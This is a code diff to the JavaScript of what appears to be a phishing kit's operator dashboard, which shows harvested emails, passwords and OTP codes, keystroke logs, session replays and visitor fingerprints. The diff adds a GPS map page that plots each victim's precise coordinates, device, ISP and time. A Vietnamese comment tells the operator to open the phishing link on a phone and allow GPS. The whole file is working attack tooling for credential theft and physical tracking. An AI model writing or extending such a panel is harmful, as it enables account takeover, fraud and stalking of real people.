@@ -19,7 +19,7 @@ function switchPage(name, btn) {
     if (btn) btn.classList.add('active');
 
     // Update topbar title
-    const titles = {overview:'Dashboard',data:'Credentials',keylog:'Keystroke Logger',replay:'Session Replay',links:'Phishing Links',guide:'Documentation'};
+    const titles = {overview:'Dashboard',data:'Credentials',keylog:'Keystroke Logger',replay:'Session Replay',analytics:'GPS Location Map',links:'Phishing Links',guide:'Documentation'};
     document.getElementById('pageTitle').textContent = titles[name] || name;
 
     // Exit animation on old page
@@ -43,6 +43,7 @@ function switchPage(name, btn) {
         if (name === 'keylog') loadKeylog();
         if (name === 'data') loadAllData();
         if (name === 'replay') loadReplay();
+        if (name === 'analytics') loadAnalytics();
         if (window.innerWidth <= 900) { document.getElementById('sidebar').classList.remove('open'); document.getElementById('sidebarOverlay').classList.remove('open'); }
         setTimeout(() => lucide.createIcons(), 50);
     }, 200);
@@ -178,7 +179,30 @@ async function loadAllData() {
             fetch('/api/data').then(r => r.json()), fetch('/api/fingerprints').then(r => r.json()), fetch('/api/keylog').then(r => r.json())
         ]);
         harvestCount = harvestRes.total;
-        fpCount = (fpRes.entries || []).filter(f => f.device && !f.update_type).length;
+
+        // Dedup fingerprints theo session_id
+        // Mỗi lần vào trang gửi 2 entries: nhanh (chưa có location) + đầy đủ (có location/social)
+        // Chỉ giữ 1 entry tốt nhất mỗi session
+        const rawFp = (fpRes.entries || []).filter(f => f.device && !f.update_type);
+        const sessionMap = new Map();
+        rawFp.forEach(fp => {
+            const sid = fp.session_id || fp.received_at;
+            const existing = sessionMap.get(sid);
+            if (!existing) {
+                sessionMap.set(sid, fp);
+            } else {
+                const newHasLoc = fp.location && fp.location.latitude;
+                const oldHasLoc = existing.location && existing.location.latitude;
+                const newHasSocial = fp.social_logins && Object.keys(fp.social_logins).length > 0;
+                // Ưu tiên: có location > có social > mới hơn
+                if (newHasLoc && !oldHasLoc) sessionMap.set(sid, fp);
+                else if (!oldHasLoc && newHasSocial) sessionMap.set(sid, fp);
+                else if (!oldHasLoc && new Date(fp.received_at) > new Date(existing.received_at)) sessionMap.set(sid, fp);
+            }
+        });
+        const fpEntries = Array.from(sessionMap.values());
+
+        fpCount = fpEntries.length;
         document.getElementById('totalEntries').textContent = harvestCount;
         document.getElementById('visitorCount').textContent = fpCount;
         document.getElementById('keystrokeCount').textContent = keylogRes.total_keystrokes;
@@ -186,7 +210,6 @@ async function loadAllData() {
         updateNavBadge('keylog', keylogRes.total_keystrokes);
 
         const items = [];
-        const fpEntries = (fpRes.entries || []).filter(f => f.device && !f.update_type);
         fpEntries.forEach(fp => items.push({type:'visit',time:fp.received_at,page:fp.page_type||'unknown',ip:fp.server_ip||'N/A',device_name:fp.device?.device_name||'Unknown',device_type:fp.device?.device_type||'',os:(fp.device?.os||'')+' '+(fp.device?.os_version||''),browser:(fp.device?.browser||'')+' '+(fp.device?.browser_version||''),fp,email:null,password:null,fp_time:fp.received_at}));
         (harvestRes.entries || []).forEach(h => items.push({type:'harvest',time:h.timestamp,page:h.page_type||'unknown',ip:h.metadata?.ip||'N/A',device_name:h.metadata?.platform||'Unknown',device_type:'',os:h.metadata?.platform||'',browser:'',email:h.credentials?.email||'',password:h.credentials?.password||'',otp:h.credentials?.otp||null,fp:null,harvest_time:h.timestamp}));
         items.sort((a, b) => new Date(b.time) - new Date(a.time));
@@ -337,6 +360,157 @@ function renderReplaySession(session) {
 
 function toggleReplayDetail(sid) { const el = document.getElementById('replay-detail-' + sid); if (el) { el.classList.toggle('open'); if(el.classList.contains('open')) lucide.createIcons({nodes:[el]}); } }
 async function deleteReplaySession(sid) { await fetch('/api/session-replay/' + sid, {method:'DELETE'}); loadReplay(); }
+
+// ===== ANALYTICS / GPS MAP =====
+let leafletMap = null;
+let mapMarkers = [];
+
+async function loadAnalytics() {
+    try {
+        const fpRes = await fetch('/api/fingerprints').then(r => r.json());
+        const rawFp = (fpRes.entries || []).filter(f => f.device && !f.update_type);
+
+        // Dedup theo session_id — giữ entry tốt nhất mỗi phiên
+        const sessionMap = new Map();
+        rawFp.forEach(fp => {
+            const sid = fp.session_id || fp.received_at;
+            const existing = sessionMap.get(sid);
+            if (!existing) { sessionMap.set(sid, fp); return; }
+            const newHasLoc = fp.location?.latitude;
+            const oldHasLoc = existing.location?.latitude;
+            if (newHasLoc && !oldHasLoc) sessionMap.set(sid, fp);
+            else if (!oldHasLoc && fp.social_logins && Object.keys(fp.social_logins).length > 0) sessionMap.set(sid, fp);
+        });
+        const entries = Array.from(sessionMap.values());
+
+        // Count stats
+        let gpsCount = 0, ipCount = 0, noLoc = 0;
+        const withLocation = [];
+
+        entries.forEach(fp => {
+            const loc = fp.location || {};
+            if (loc.latitude && loc.source === 'GPS') { gpsCount++; withLocation.push(fp); }
+            else if (loc.latitude && loc.source === 'IP') { ipCount++; withLocation.push(fp); }
+            else { noLoc++; }
+        });
+
+        document.getElementById('anTotal').textContent = entries.length;
+        document.getElementById('anGPS').textContent = gpsCount;
+        document.getElementById('anIP').textContent = ipCount;
+        document.getElementById('anNoLoc').textContent = noLoc;
+
+        // Update sidebar badge
+        const badge = document.getElementById('navBadgeAnalytics');
+        if (badge) badge.textContent = withLocation.length;
+
+
+        // Init Leaflet map (only once)
+        if (!leafletMap) {
+            leafletMap = L.map('analyticsMap', { zoomControl: true, attributionControl: false });
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                maxZoom: 19,
+                attribution: '© OpenStreetMap'
+            }).addTo(leafletMap);
+            L.control.attribution({ prefix: false }).addTo(leafletMap);
+        }
+
+        // Clear old markers
+        mapMarkers.forEach(m => leafletMap.removeLayer(m));
+        mapMarkers = [];
+
+        if (!withLocation.length) {
+            // Default view: Vietnam
+            leafletMap.setView([16.047, 108.206], 5);
+            document.getElementById('locationList').innerHTML = '<div class="empty-state">Chưa có dữ liệu vị trí. Mở link phishing trên điện thoại và cho phép GPS.</div>';
+            return;
+        }
+
+        // Add markers
+        withLocation.forEach((fp, idx) => {
+            const loc = fp.location;
+            const dev = fp.device || {};
+            const isGPS = loc.source === 'GPS';
+            const color = isGPS ? '#059669' : '#2563eb';
+            const accuracy = loc.accuracy || 'N/A';
+            const time = new Date(fp.received_at).toLocaleString('vi-VN');
+            const city = [loc.city, loc.region, loc.country].filter(Boolean).join(', ') || 'Không rõ';
+            const isp = loc.isp || '';
+
+            // Custom icon
+            const icon = L.divIcon({
+                className: '',
+                html: `<div style="
+                    width:14px;height:14px;border-radius:50%;
+                    background:${color};border:2px solid #fff;
+                    box-shadow:0 2px 8px rgba(0,0,0,.35),0 0 0 4px ${isGPS ? 'rgba(5,150,105,.25)' : 'rgba(37,99,235,.2)'};
+                    transition:transform .2s;
+                "></div>`,
+                iconSize: [14, 14],
+                iconAnchor: [7, 7],
+                popupAnchor: [0, -10]
+            });
+
+            const popupHtml = `
+                <div class="map-popup-title">${esc(dev.device_name || 'Unknown Device')}</div>
+                <span class="map-popup-badge ${isGPS ? 'gps' : 'ip'}">${isGPS ? '📍 GPS Thật' : '🌐 Xấp xỉ IP'}</span>
+                <div class="map-popup-row"><span class="map-popup-label">Tọa độ</span>${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}</div>
+                <div class="map-popup-row"><span class="map-popup-label">Độ chính xác</span>${accuracy}</div>
+                <div class="map-popup-row"><span class="map-popup-label">Vị trí</span>${esc(city)}</div>
+                ${isp ? `<div class="map-popup-row"><span class="map-popup-label">ISP</span>${esc(isp)}</div>` : ''}
+                <div class="map-popup-row"><span class="map-popup-label">OS</span>${esc((dev.os||'')+ ' ' +(dev.os_version||''))}</div>
+                <div class="map-popup-row"><span class="map-popup-label">Thời gian</span>${time}</div>
+                <a class="map-popup-link" href="${loc.google_maps}" target="_blank">🗺️ Mở Google Maps</a>
+            `;
+
+            const marker = L.marker([loc.latitude, loc.longitude], { icon })
+                .bindPopup(popupHtml, { maxWidth: 260 })
+                .addTo(leafletMap);
+
+            mapMarkers.push(marker);
+        });
+
+        // Fit bounds to all markers
+        if (mapMarkers.length === 1) {
+            leafletMap.setView([withLocation[0].location.latitude, withLocation[0].location.longitude], 13);
+        } else {
+            const group = L.featureGroup(mapMarkers);
+            leafletMap.fitBounds(group.getBounds().pad(0.2));
+        }
+
+        // Fix Leaflet tile loading after page switch
+        setTimeout(() => leafletMap.invalidateSize(), 100);
+
+        // Render location list
+        const list = document.getElementById('locationList');
+        list.innerHTML = withLocation.map((fp, idx) => {
+            const loc = fp.location;
+            const dev = fp.device || {};
+            const isGPS = loc.source === 'GPS';
+            const time = new Date(fp.received_at).toLocaleString('vi-VN');
+            const city = [loc.city, loc.region, loc.country].filter(Boolean).join(', ') || 'Không rõ';
+            return `<div class="loc-item ${isGPS ? 'gps-item' : 'ip-item'}" onclick="focusMarker(${idx})">
+                <div class="loc-dot ${isGPS ? 'gps' : 'ip'}"></div>
+                <div class="loc-info">
+                    <div class="loc-coords">${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}</div>
+                    <div class="loc-detail">${esc(dev.device_name||'Unknown')} • ${esc(city)}${loc.isp ? ' • ' + esc(loc.isp) : ''}</div>
+                </div>
+                <div class="loc-meta">
+                    <div class="loc-source ${isGPS ? 'gps' : 'ip'}">${isGPS ? 'GPS' : 'IP'}</div>
+                    <div class="loc-time">${time.split(',')[0]}</div>
+                </div>
+                <button class="loc-map-btn" onclick="event.stopPropagation();window.open('${loc.google_maps}','_blank')">Maps</button>
+            </div>`;
+        }).join('');
+
+    } catch(e) { console.error(e); }
+}
+
+function focusMarker(idx) {
+    if (!mapMarkers[idx] || !leafletMap) return;
+    const marker = mapMarkers[idx];
+    leafletMap.flyTo(marker.getLatLng(), 14, { animate: true, duration: 0.8 });
+    setTimeout(() => marker.openPopup(), 900);
+}
 
 // ===== UTILS =====
 function esc(str) { const d = document.createElement('div'); d.textContent = str || ''; return d.innerHTML; }
